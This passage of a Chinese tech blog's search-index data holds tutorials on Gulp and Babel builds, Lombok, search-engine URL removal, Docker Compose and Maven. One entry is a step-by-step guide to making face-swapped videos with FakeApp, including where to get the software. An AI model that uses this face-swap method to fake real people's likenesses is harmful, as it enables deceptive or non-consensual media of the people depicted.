minifyCSS: true, minifyURLs: true, })) .pipe(gulp.dest('/tmp/blog/')) .pipe(debug({title: '压缩html源文件:'}));});// 拷贝经压缩的html源文件(只拷贝修改过的压缩源文件)gulp.task('copy-minify-html', ['generate-minify-html'], function() { return gulp.src('/tmp/blog/**/*.html') .pipe(changed('./public/', {extension:'.html', hasChanged: changed.compareContents})) .pipe(gulp.dest('./public/')) .pipe(debug({title: '拷贝经压缩的html源文件:'}));});// 压缩图片（深度压缩）gulp.task('minify-images', function() { gulp.src('./public/asset/**/*.{png,jpg,gif,ico}') .pipe(cache(imagemin({ //启用缓存，只压缩发生变化的图片 progressive: true, //是否无损压缩jpg图片 interlaced: false, //是否隔行扫描gif进行渲染 svgoPlugins: [{removeViewBox: false}], //是否移除svg的viewbox属性 multipass: false, //是否多次优化svg直到完全优化 optimizationLevel: 5, //优化等级，取值范围：0-7，默认值：3 use: [pngquant()] //使用pngquant深度压缩png图片的imagemin插件 }))) .pipe(gulp.dest('./public/asset')) .pipe(debug({title: '压缩图片:'}));});// gulp3的写法gulp.task('minify-js', ['generate-minify-js', 'copy-minify-js']);gulp.task('minify-css', ['generate-minify-css', 'copy-minify-css']);gulp.task('minify-html', ['generate-minify-html', 'copy-minify-html']); Gulp 直接调用 Hexo-Cli 命令如果需要 Gulp 直接调用 Hexo 的命令（hexo-cli），即执行 Hexo 的 clean、generate、server、deploy 等操作，可以参考以下代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546var Hexo = require('hexo');var hexo = new Hexo(process.cwd(), {});gulp.task('hexo-clean', function() { return hexo.init().then(function() { return hexo.call('clean', { watch: false }).then(function() { return hexo.exit(); }).catch(function(err) { return hexo.exit(err); }); });});gulp.task('hexo-generate', function() { return hexo.init().then(function() { return hexo.call('generate', { watch: false }).then(function() { return hexo.exit(); }).catch(function(err) { return hexo.exit(err); }); });});gulp.task('hexo-server', function() { return hexo.init().then(function() { return hexo.call('server', {}); }).catch(function(err) { console.log(err); });});gulp.task('hexo-deploy', function() { return hexo.init().then(function() { return hexo.call('deploy', { watch: false }).then(function() { return hexo.exit(); }).catch(function(err) { return hexo.exit(err); }); });}); 显示 Gulp 的详细构建日志信息为了方便调试 Gulp 的构建，可以安装 gulp-debug 模块，然后添加 JS 代码将构建日志信息打印出来，示例代码如下： 1234567891011var debug = require('gulp-debug');gulp.task('minify-js', function() { return gulp.src('./lib/*.js') .pipe(babel({ presets: ['es2015'] })) .pipe(uglify()) .pipe(gulp.dest('./build')) .pipe(debug({title: '压缩js文件:'}));}); 显示 Gulp 构建失败时的错误日志信息默认情况下，如果 Gulp 执行构建任务出错，不一定都能显示详细的错误日志信息。为了方便定位问题，可以安装 gulp-util 模块，然后添加 JS 代码将错误日志信息打印出来，示例代码如下： 12345678910111213var gutil = require('gulp-util');gulp.task('minify-js', function() { return gulp.src('./lib/*.js') .pipe(babel({ presets: ['es2015'] })) .pipe(uglify()) .on('error', function(err) { gutil.log(gutil.colors.red('[Error]'), err.toString()); }) .pipe(gulp.dest('./build'));}); 升级 Gulp 的版本Gulp 版本升级将 Gulp 从版本 3.9.1 升级到 4.0.2，可以使用以下命令： 123# 全局安装版本检测、版本升级工具$ npm install -g npm-check$ npm install -g npm-upgrade 1234567891011121314151617181920# 进入博客的根目录$ cd /blog-root# 检测Hexo哪些模块可以升级$ npm-check# 删除package-lock.json# rm -rf package-lock.json# 更新package.json$ npm-upgrade# 更新Hexo的模块$ npm update --save# 若出现依赖的问题，用以下命令检查一下，然后把报错的统一修复一下即可$ npm audix# 或者强制更新$ npm update --save --force Babel 版本升级将 Babel 从版本 6 升级到 7，官方版本升级说明看这里。 12345# 卸载 Babel 6$ npm uninstall babel-core babel-loader babel-preset-env babel-preset-es2015 --save# 安装 Babel 7$ npm install gulp-babel @babel/core @babel/preset-env babel-preset-es2015 babel-core@6 --save 若 Gulp + Babel 执行文件压缩时，提示 [BABEL] Note: The code generator has deoptimised the styling of \"xxx/xxx.js\" as it exceeds the max of \"500KB\"，可以添加 compact\": false 参数来忽略该提示，示例代码如下： 123456789gulp.task('minify-js', function() { return gulp.src('./public/lib/**/*.js') .pipe(babel({ \"compact\": false, presets: ['es2015'] })) .pipe(uglify()) .pipe(gulp.dest('./public/lib'));}); Gulp 版本升级后的代码兼容处理当 Gulp 从版本 3 升级到 4 之后，执行 Gulp 命令时若出现 Gulp error: The following tasks did not complete: Did you forget to signal async completion? 错误，则需要参考以下方式更改代码。Gulp 4 最大的变化就是不能像以前那样传递一个依赖任务列表，即不能再用 Gulp3 的方式指定依赖任务，需要配合使用 gulp.series 和 gulp.parallel，因为 Gulp 任务现在只有两个参数。在 Gulp4 中必须明确通知 Gulp 任务已经完成，而在 Gulp3 中，通常不必要这么做，因为如果没有发出异步完成信号，那么当任务返回时，Gulp3 会认为它已经完成。通知 Gulp 任务已完成的另一个常见方法是 Return 一个流或者 Promise，异步任务还可以利用回调函数来通知 Gulp 任务已完成，相关资料可参考这里。下面是使用回调函数来通知 Gulp4 任务已完成的示例代码： 123456789gulp.task('generate-minify-css', gulp.series(function(cb){ // 异步操作 gulp.src('./public/css/**/*.css') .pipe(changed('/tmp/blog/css/', {extension:'.css', hasChanged: changed.compareContents})) .pipe(minifycss()) .pipe(gulp.dest('/tmp/blog/css/')) .pipe(debug({title: '压缩css源文件:'})); cb();})); Gulp 与 Babel 版本升级后的完整依赖项1234567891011121314151617\"@babel/core\": \"^7.14.8\",\"@babel/preset-env\": \"^7.14.9\",\"babel-core\": \"^6.26.3\",\"babel-preset-es2015\": \"^6.24.1\",\"gulp\": \"^4.0.2\",\"gulp-babel\": \"^7.0.1\",\"gulp-callback\": \"0.0.3\",\"gulp-changed\": \"^4.0.2\",\"gulp-clean\": \"^0.4.0\",\"gulp-debug\": \"^4.0.0\",\"gulp-htmlclean\": \"^2.7.22\",\"gulp-htmlmin\": \"^5.0.1\",\"gulp-imagemin\": \"^7.1.0\",\"gulp-minify-css\": \"^1.2.4\",\"gulp-uglify\": \"^3.0.2\",\"gulp-util\": \"^3.0.8\",\"imagemin-pngquant\": \"^9.0.2\", 常见问题压缩图片出错执行 gulp generate-minify-images 任务（压缩图片）时，终端输出如下的错误信息： 12345678[13:55:24] Finished 'generate-minify-images' after 1.2 s(node:3702) UnhandledPromiseRejectionWarning: Error: spawn /usr/local/hexo-blog/node_modules/mozjpeg/vendor/cjpeg ENOENT at Process.ChildProcess._handle.onexit (internal/child_process.js:269:19) at onErrorNT (internal/child_process.js:465:16) at processTicksAndRejections (internal/process/task_queues.js:80:21)(Use `node --trace-warnings ...` to show where the warning was created)(node:3702) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). To terminate the node process on unhandled promise rejection, use the CLI flag `--unhandled-rejections=strict` (see https://nodejs.org/api/cli.html#cli_unhandled_rejections_mode). (rejection id: 2)(node:3702) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code. 可以执行以下命令来解决，这里强烈建议在本地连接上 VPN 后，再执行 npm install 命令，这样可以确保所有下载的文件就都是完整的 1234567891011121314# 文件授权$ chmod 755 -R ~/.npm# 进入博客的根目录$ cd /blog-root# 删除所有模块文件$ rm -rf node_modules# 重建$ npm rebuid# 安装模块$ npm install var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ \"id\": \"readmore-container\", \"blogId\": \"96641-5333172926158-056\", \"name\": \"全栈技术驿站\", \"qrcode\": \"https://www.techgrow.cn/img/wx_mp_qr.png\", \"keyword\": \"Tech\", \"lockToc\": \"yes\", \"random\": \"0.9\" }); } catch(e) { console.warn(e.name + \" : \" + e.message); } }",tags:"静态博客 前端"},{title:"Lombok 使用教程",url:"/posts/15ca8348.html",text:'项目中使用 Lombok 项目添加 Lombok 的 Maven 依赖： 123456&lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;version&gt;1.18.12&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt;&lt;/dependency&gt; IDEA 安装 Lombok 插件： IDEA 启用 Annocation Processors： 使用 Lombok 提供的注解： @Getter @Setter @ToString @EqualsAndHashCode @NonNull @NoArgsConstructor @RequiredArgsConstructor @AllArgsConstructor @Data @Builder @Log @Cleanup @SneakyThrows 使用 Lombok 的优点 减少代码维护：新增属性的时候，会减少非常多的代码维护工作 减少模板代码：Lombok 对大量的模板代码进行了封装，可以减少重复代码 使用 Lombok 的缺点 1) 侵入性太强：Lombok 的使用要求开发者一定要在 IDE 中安装对应的插件，如果项目组中使用了 Lombok，那么所有开发人员都必须安装 IDE 插件，否则就没办法协同开发。 2) 降低代码可读性：在项目中使用了 Lombok，确实可以帮忙减少很多代码，但是这些代码是要在编译阶段才会生成的，所以在开发的过程中，其实很多代码其实是缺失的。大量使用 Lombok，就导致代码的可读性降低，而且也会给代码调试带来一定的问题。比如，想要知道某个类中的某个属性的 Getter 方法都被哪些类引用的话，就没那么简单了。 3) 容易踩坑：在使用 Lombok 过程中，如果对于各种注解的底层原理不理解的话，很容易产生意想不到的结果。举一个简单的例子，当使用 @Data 定义一个类的时候，会自动帮我们生成 equals() 方法，但是如果只使用了 @Data，而不使用 @EqualsAndHashCode(callSuper=true) 的话，会默认是 @EqualsAndHashCode(callSuper=false)，这时候生成的 equals() 方法只会比较子类的属性，不会考虑从父类继承的属性，无论父类属性访问权限是否开放，这就可能得到意想不到的结果。 4) 影响升级：因为 Lombok 对于代码有很强的侵入性，这就可能带来一个比较大的问题，那就是会影响日后对 JDK 版本的升级。按照如今 JDK 的升级频率，每半年都会推出一个新的版本，但是 Lombok 作为一个第三方工具，并且是由开源团队维护的，那么 Lombok 的迭代速度是无法保证的。如果日后需要升级到某个新版本 JDK 的时候，若其中的特性在 Lombok 中不支持的话就会受到影响。还有一个可能带来的问题，就是 Lombok 自身的升级也会受到限制，因为一个应用可能依赖了多个 Jar 包，而每个 Jar 包可能又要依赖不同版本的 Lombok，这就导致在应用中需要做版本仲裁，而 Jar 包版本仲裁是没那么容易的，而且发生问题的概率也很高。 5) 破坏封装性：使用 Lombok 会破坏封装性，众所周知，Java 的三大特性包括封装性、继承性和多态性；如果在代码中直接使用 Lombok，那么会自动生成 Getter、Setter 等方法，这就意味着一个类中的所有参数都自动提供了设置和读取方法。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"java"},{title:"人工智能视频换脸初级教程",url:"/posts/8f51ce11.html",text:'一些说明FBI WARING at 2019.02.06原文章写于 2018.02.20，将近于 1 年前，根据科技圈的进化规律，本文早已落伍。而且本文的本质是基于一款软件（fakeapp）写的教程，如果无法获取软件（因为官网早就挂了），那本文已无任何意义。不死心的可以试下磁力链接，在能下载到 fakeapp 的前提下，再阅读本文。本文的 fakeapp 是 2.0 的版本，其他版本自求多福。 环境配置，FakeApp (Windows 专用)官网下载或使用磁力链接 (官网已挂，磁力自求多福)，magnet:?xt=urn:btih:598F5888522C860D48629EB8EC267496B4322E70 GPU 加速 (强烈建议)N 卡建议 GTX1060 起，显存 2G 以上无 N 卡，可以使用 CPU， but very low如果有 N 卡，建议使用 GPU 计算，需要先安装 Nvidia CUDA , 建议安装 8.0 版本，下载地址 VC 库 (可选)附赠品，如果操作过程中报错了，可以选择安装 VC 库，下载地址 原理简介如何把 A 视频的脸，替换进 B 视频？主要分以下几步： 1. 收集 A,B 的脸因为是视频，所以要用一些特殊的技巧，把一个视频，转换成一张张图片，比如 10s 的视频，可能会有上百张图片，然后在上百张图片里，找出带有人脸的，最终都截取成相同大小的，比如 256*256 的脸图片 2. 训练模型，A-&gt;B有了 A 的 256*256 脸，和 B 的 256*256 脸，通过一些特殊的技巧，能找到两张脸之间联系，图片数越多，联系也就越紧，找到关系后，保存成 模型。这个模型的作用就是，给一张 A 的脸，输入进模型，模型会给出 B 的脸 3. 换脸随便找一个 A 的视频，依旧是转换成一张张图片，依旧要找出带有人脸的图片。把这一张张图片，丢进第 2 步得到的模型，就能得出一张张替换成 B 脸的图片。最后把所有的图片，再合并成视频，换脸完成 FakeApp 使用分三步，分别对应上面的三部曲 1.GetDataSet就一个参数，输入视频的路径。这里其实是要依次执行 2 个视频，一个 A 视频，一个 B 视频，比如 C:\\video\\a.mp4执行完毕后，会在 c:\\video 目录下，生成 dataset-a 目录dataset-a 目录，就是一张张图片 ，dataset-a 里面，还有个 extracted 目录extracted 目录，就是只保留人脸的图片，当然可能会有误差，因为是程序自动切的注意：要浏览 extracted 目录，只保留 256*256 的人脸图片，其他都删掉最终完成后，会有 dataset-a，dataset-b 两个目录，里面分别有 extracted 目录 第一步主要是从视频里取得人脸的样本集。 程序可能会报 Failed to execute script align_faces，这种情况可以尝试安装 VC 库，或者从其他途径获得人脸样本集，只要保证 2 张人脸的图片，大小一致 2.Train有三个参数： model 可以在 c:\\video 下，新建个目录叫 model，就是空的。那这个参数下就输入 c:\\video\\model，用来保存模型的结果 Data A, 对应了截取后的人脸目录，也就是 c:\\video\\dataset-a\\extracted Data B，同上，换上 b 的三个目录输入完后，点击 Train，开始漫长的等待，会有结果显示， Loss A，Loss B，一般小于 0.02，即可认为 OK，自主停掉程序 3.Created还是三个参数： model，同上，输入跑完的模型目录，依然是 c:\\video\\model 输入要换脸的视频，可以拿 a 视频做测试 c:\\video\\a.mp4 fps，30 or 24 ，没啥追求的就 24 吧跑完之后，就得到了换脸后的视频 总结 有个好显卡 两个视频的人物表情，角度尽量相似 相关开源项目 faceswap DeepFaceLab deepfakes_faceswap var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"ai"},{title:"通过谷歌站长平台快速收录与删除网页",url:"/posts/fa4ebc1a.html",text:'清理垃圾或者无效的谷歌搜索记录 清理步骤如下： 为垃圾或者无效的搜索记录链接制作 301 跳转 在 robots.txt 中添加禁止收录或者无效的搜索记录的链接 重新生成新的站点地图文件，并提交到 Google 站长平台 删除谷歌搜索记录 由于上面的步骤做完还需要一段时间才能生效，而且每次使用谷歌搜索还是可以看到自己的网站挂着垃圾或无效链接，此时可以使用谷歌站长平台的 “移除网址” 功能来删除搜索记录。进到谷歌站长平台的操作后台，找到谷歌索引 -&gt; 移除网址。在谷歌搜索框中输入”site:xxx.com” 查看自己站点的收录结果，把不想被收录的 URL（不包含 http://域名，例如填写 /posts/6edb1958/ 即可）提交到移除网址里面，生效时间一般是 1-6 小时。 谷歌浏览器安装批量删除搜索记录的插件 如果垃圾或者无效的谷歌收录页面有上百个，要是一个个提交到移除网址里面，工作量非常大也不现实，此时可以使用浏览器插件批量删除搜索记录。下载浏览器插件，Chrome 安装插件需要开启开发模式，安装步骤如下： 从 Github 下载插件到本地并解压 浏览器打开链接 chrome://extensions/ ，启用开发者模式 选择” 加载已解压的扩展程序”，然后选择插件的解压目录 插件安装后，在谷歌站长平台的 “Remove URLs” 页面中，会发现多出 “选择文件” 的按钮，图片如下： 谷歌浏览器安装 SEOQUAKE 插件 由于批量删除搜索记录的插件需要 URL 数据文件，因此需要安装 SEOQUAKE 插件导出搜索记录中的所有链接。SEOQUAKE 插件的安装，可以在 Chrome 网上商店搜索”SEOQUAKE”，然后直接安装即可。在谷歌搜索框中输入”site:xxx.com” 查看自己站点的收录结果，然后点击 SEOQUAKE 插件的 ” 导出 CSV” 按钮直接导出 CSV 文件。SEOQUAKE 插件默认只导出单页面的所有搜索记录。 创建 URL 数据文件 将上面导出的 CSV 文件中的 URL 统一复制到单独的文件中（例如：google-remove-urls.txt），格式为每行都是单独的 URL 地址（不包含 http://域名），使用回车符 \\n 作为结束符。示例如下： 1234/posts/3cf5ae19//posts/1b3fbf25//posts/b31f4d18//posts/fcb4fc9d/index.html 通过批量删除搜索记录的插件提交 URL 数据文件 找到谷歌索引 -&gt; 移除网址，点击 “选择文件” 按钮，选择上面整理的 URL 数据文件，之后会看到浏览器页面反复自动刷新，页面中的删除列表也会自动添加 URL。 谷歌快速收录网页 找到抓取 -&gt; Google 抓取方式，填写希望被收录的 URL，然后点击 “Fetch AND RENDER” 按钮后会有弹窗，可以选择仅抓取此网址（每月限制提交 500 次）或者抓取此网址及其直接链接（每月限制提交 10 次）。如果填写的是 URL 目录，则需要以 / 结尾，否则谷歌会把不加 / 的网址判定 301 跳转。当 URL 提交之后，最后记得点击 “请求编入索引” 按钮。 相关站点 批量删除搜索记录的 Chrome 插件 操作 Google Webmaster 让网站快速收录与删除 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"爬虫"},{title:"删除百度搜索引擎收录的死链与无效快照",url:"/posts/1619dded.html",text:'百度站长死链提交工具介绍 死链提交工具生效时间为 3 天 死链提交有两种方式：文件提交、规则提交 死链提交工具仅识别 404 数据，请提交 404 数据；如误使用本工具，且站点内容不为死链，则提交不会生效 死链提交工具是网站向百度提交死链的数据推送工具，被推送死链将被百度搜索屏蔽。网站存在大量死链，将影响网站的站点评级 百度站长平台提交死链 注册百度站长平台帐号，然后登录进去找到” 数据引入” -&gt; “死链提交”。 文件提交方式 第一步，制作死链文件处理网站已存在的死链，并将这些死链页面设置成为 404 页面，即百度访问它们时返回 404 代码。将需要提交的死链列表制作成一个死链文件，制作方法与 sitemap 格式及制作方法一致。死链文件的格式为 txt 或者 xml，每个地址文件最多包含 50000 个网址且需小于 10MB，推荐使用 xml 格式。死链 xml 文件示例内容如下： 123456789101112131415&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"&gt; &lt;url&gt; &lt;loc&gt;http://www.techgrow.online/posts/cd6beb9c/index.html&lt;/loc&gt; &lt;lastmod&gt;2019-02-26&lt;/lastmod&gt; &lt;changefreq&gt;daily&lt;/changefreq&gt; &lt;priority&gt;1.0&lt;/priority&gt; &lt;/url&gt; &lt;url&gt; &lt;loc&gt;http://www.techgrow.online/posts/67ba58dd/index.html&lt;/loc&gt; &lt;lastmod&gt;2019-02-26&lt;/lastmod&gt; &lt;changefreq&gt;daily&lt;/changefreq&gt; &lt;priority&gt;1.0&lt;/priority&gt; &lt;/url&gt;&lt;/urlset&gt; 第二步，将死链文件放置在网站根目录下比如您的网站为 example.com，您已制作了一个 silian_example.xml 死链文件，则将 silian_example.xml 上传至网站根目录即 example.com/silian_example.xml 第三步，提交死链文件 找到” 数据引入” -&gt; “死链提交” -&gt; “文件提交” 提交死链文件时，每次最多可提交 20 条死链文件地址 提交死链文件，填写死链文件地址（如： www.example.com/silian_example.xml ），选择更新时间，然后提交 第四步，管理已提交的死链文件提交完之后，可在数据反馈里看到已提交的死链文件，如果死链文件里面有新的死链，可以选择文件后，点击手动更新文件，即对更新的死链链接进行了提交。 规则提交方式 第一步找到” 数据引入” -&gt; “死链提交” -&gt; “规则提交” 第二步，提交死链规则填写死链规则，死链规则需要以 / 或？结尾。/ 结尾表示删除一个目录，例如：http://www.example.com/silian/ 包含 silian 目录下的所有链接。? 结尾表示 CGI 形式的通配链接，例如：http://www.example.com/silian? 包含长相为 silian?* 的所有链接。相同的死链规则一个月内只能提交一次。 第三步，管理已提交的死链规则死链规则提交完之后，同样可在数据反馈里看到已提交的死链规则，如果死链规则里面有新的死链，可以选择规则后，点击手动更新死链，即对更新的死链链接进行了提交。 删除百度搜索的快照 第一步，获取百度快照链接 第二步，提交需要删除的百度快照 / 索引链接打开百度服务中心的意见反馈页面，找到 “快照删除与更新”，然后填写百度快照 / 索引链接，最后点击 “提交” 按钮进行提交。 第三步，查看快照删除的处理进度找到百度服务中心页面的 “我的反馈”，点击进去可以在页面上看到快照删除与更新的处理进度。百度处理快照删除与更新的速度较慢，提交后一般需要 24 小时左右请求才会被处理。 死链 XML 文件格式详细说明 12345678910111213141516&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!-- urlset，urlset 用来标记整个文档的开头，最少出现 1 次 最多出现 1 次 --&gt;&lt;urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"&gt; &lt;!-- url，url 标记每条信息的开始和结束，最少出现 0 次 最多出现 50000 次 --&gt; &lt;url&gt; &lt;!-- loc，该条数据的存放地址，最少出现 1 次 最多出现 1 次，类型为 URL 地址，最小长度 1 个字符 最大长度 256 个字符 必须符合正则表达式(http://)(.+) --&gt; &lt;loc&gt;http://www.techgrow.online/posts/cd6beb9c/&lt;/loc&gt; &lt;!-- lastmod，指该条数据的最新一次更新时间，最少出现 0 次 最多出现 1 次，类型为日期或日期时间，格式为 YYYY-MM-DD 的日期或者 格式为 YYYY-MM-DDThh:mm:ss 的日期时间（请注意日期与时间之间以“T”分隔） --&gt; &lt;lastmod&gt;2019-02-26&lt;/lastmod&gt; &lt;!-- changefreq，指该条数据的更新频率，最少出现 0 次 最多出现 1 次，类型为字符串，有效值为：always、hourly、daily、weekly、monthly、yearly、never --&gt; &lt;changefreq&gt;daily&lt;/changefreq&gt; &lt;!-- priority，用来指定此链接相对于其他链接的优先权比值，此值定于 0.0-1.0 之间，最少出现 0 次 最多出现 1 次，类型为小数，最小值为（包含）0.0 最大值为（包含）1.0 --&gt; &lt;priority&gt;1.0&lt;/priority&gt; &lt;/url&gt;&lt;/urlset&gt; var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"爬虫"},{title:"Docker 之十七 Docker-Compose 安装与使用",url:"/posts/b31f4d18.html",text:'相关站点 Docker Compose Docs Docker Compose Github Docker Compose Releases Docker Compose 介绍 Docker Compose 项目来源于以前的 fig 项目，使用 Python 语言编写，是 Docker 官方推出的一款单机容器编排工具，与 Docker Swarm、Docker Machine 并称为 Docker 容器编排三剑客。其支持定义和运行多容器的应用，可以一条命令启动多个容器，使用 Docker Compose 后不再需要使用 Shell 脚本来启动容器。Docker Compose 通过一个配置文件来管理多个 Docker 容器，在配置文件中所有的容器通过 services 来定义，然后使用 docker-compose 命令来启动、停止、重启应用和应用中的服务以及所有依赖服务的容器，非常适合组合使用多个容器进行开发的场景。 安装 Docker Compose Docker Compose 具体的版本号可以从 Docker Compose Releases 获取。 1234567891011# 下载二进制文件，如果需要安装其他版本的话，修改下面命令中的版本号即可# curl -L https://github.com/docker/compose/releases/download/1.24.0-rc1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose# 校验二进制文件的完整性，对比https://github.com/docker/compose/releases/tag/1.24.0-rc1页面中二进制文件真实的SHA-256sum值# sha256sum /usr/local/bin/docker-compose# 赋予二进制文件可执行权限# chmod +x /usr/local/bin/docker-compose# 查看docker-compose的版本号# docker-compose version 安装 Docker Compose 的命令自动补全工具 1234567# 安装bash命令自动补全软件包# yum install bash-completion# 下载docker-compose命令自动补全工具的二进制文件，这里的版本号必须和上面docker-compose的版本号一致# curl -L https://raw.githubusercontent.com/docker/compose/1.24.0-rc1/contrib/completion/bash/docker-compose -o /etc/bash_completion.d/docker-compose# 注意：docker-compose命令自动补全功能在重新登录后才会生效 Docker Compose 常用命令 1234567891011121314151617181920# 拉取镜像# docker-compose pull# 创建并前台启动容器# docker-compose up# 创建并后台启动容器# docker-compose up -d# 查看容器的运行状态# docker-compose ps# 启动容器# docker-compose start# 停止容器# docker-compose stop# 停止并删除容器，包括网络、数据卷（特别注意，此操作会删除所有容器的数据，且数据不可恢复）# docker-compose down 若 YAML 配置文件不在当前目录下，或者配置文件名不是 docker-compose.yml、docker-compose.yaml，那么则需要通过 -f 参数指定 YAML 配置文件的路径 12# 指定YAML配置文件，拉取镜像# docker-compose -f /example/nacos-standalone-mysql-5.7.yml pull Docker Compose 配置文件编写示例 docker-compose.yml 配置文件的内容如下，主要定义了容器 zookeeper 与 dubbo-admin，其中通过自定义网络（网桥）来指定每个容器的 IP 地址（静态 IP） 1234567891011121314151617181920212223242526272829303132version: "3.5"services: zookeeper: image: clay/zookeeper-server:3.4.13 container_name: dubbo-zookeeper ports: - 2181:2181 networks: distributed-network: ipv4_address: 172.171.0.2 volumes: - \'/container/zookeeper/log:/usr/local/zookeeper-3.4.13/log\' - \'/container/zookeeper/data:/usr/local/zookeeper-3.4.13/data\' dubbo-admin: image: clay/dubbo-admin:0.1 container_name: dubbo-admin depends_on: - zookeeper networks: distributed-network: ipv4_address: 172.171.0.3 ports: - 8083:8080networks: distributed-network: name: distributed-network driver: bridge ipam: config: - subnet: 172.171.0.0/24 Docker Compose 覆盖镜像中的 CMD 指令 12345678910111213version: "3.5"services: redis: image: redis:5.0.4-stretch container_name: redis-5.0.4 privileged: false ports: - 6379:6379 volumes: - \'/container/redis/data:/data\' - \'/container/redis/redis.conf:/usr/local/etc/redis/redis.conf\' command: redis-server /usr/local/etc/redis/redis.conf Docker Compose 指定网络模式 12345678910111213141516version: "2"services: nacos: image: nacos/nacos-server:latest container_name: nacos-standalone-mysql env_file: - /usr/nacos/env/nacos-standlone-mysql.env volumes: - /usr/nacos/logs/:/home/nacos/logs - /usr/nacos/init.d/custom.properties:/home/nacos/init.d/custom.properties ports: - "8848:8848" - "9555:9555" network_mode: host restart: on-failure 参考资料 Docker Compose 菜鸟教程 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"Maven 开发随笔",url:"/posts/5fee1c55.html",text:'Maven 常规配置Maven 调试技巧 mvn dependency:tree，打印依赖树 mvn clean -X，使用 -X 参数输出详细的日志信息 mvn -X，查看当前生效的是哪个 settings.xml 配置文件 mvn help:effective-settings，查看正在起作用的是那个 settings.xml 的文件内容 添加阿里云镜像仓库全局配置 添加阿里云的镜像到 Maven 的 setting.xml 配置文件中，这样就不需要每次在 pom.xml 中添加镜像仓库的配置内容，在 &lt;mirrors&gt; 节点里添加对应的子节点即可： 1234567891011121314&lt;mirrors&gt; &lt;mirror&gt; &lt;id&gt;alimaven&lt;/id&gt; &lt;name&gt;aliyun maven&lt;/name&gt; &lt;url&gt;https://maven.aliyun.com/repository/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt; &lt;mirror&gt; &lt;id&gt;repo2&lt;/id&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt; &lt;url&gt;http://repo2.maven.org/maven2/&lt;/url&gt; &lt;/mirror&gt;&lt;/mirrors&gt; 单项目配置 单项目配置时，需要修改项目的 pom.xml 文件，通过覆盖默认的中央仓库的配置，实现中央仓库地址的变更 12345678910111213141516&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;central&lt;/id&gt; &lt;name&gt;aliyun maven&lt;/name&gt; &lt;url&gt;https://maven.aliyun.com/repository/public/&lt;/url&gt; &lt;layout&gt;default&lt;/layout&gt; &lt;!-- 是否开启发布版构件下载 --&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;!-- 是否开启快照版构件下载 --&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 值得一提的是，Maven 